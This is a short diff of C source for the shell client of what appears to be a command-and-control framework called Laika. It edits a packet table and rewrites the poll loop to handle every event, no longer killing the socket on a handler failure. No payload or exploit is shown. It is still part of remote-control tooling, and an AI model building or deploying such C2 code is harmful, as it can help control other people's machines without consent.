@@ -132,7 +132,7 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         shellC_handleShellData,
         0,
-    true),
+    true)
 };
 
 /* socket event */
@@ -231,18 +231,20 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
 }
 
 bool shellC_poll(tShell_client *client, int timeout) {
-    struct sLaika_pollEvent *evnt;
-    int numEvents;
+    struct sLaika_pollEvent *evnts, *evnt;
+    int numEvents, i;
 
     /* flush any events prior (eg. made by a command handler) */
     laikaP_flushOutQueue(&client->pList);
-    evnt = laikaP_poll(&client->pList, timeout, &numEvents);
+    evnts = laikaP_poll(&client->pList, timeout, &numEvents);
 
     if (numEvents == 0) /* no events? timeout was reached */
         return false;
 
-    if (!laikaP_handleEvent(evnt))
-        laikaS_kill(&client->peer->sock);
+    for (i = 0; i < numEvents; i++) {
+        evnt = &evnts[i];
+        laikaP_handleEvent(evnt);
+    }
 
     /* flush any events after (eg. made by a packet handler) */
     laikaP_flushOutQueue(&client->pList);
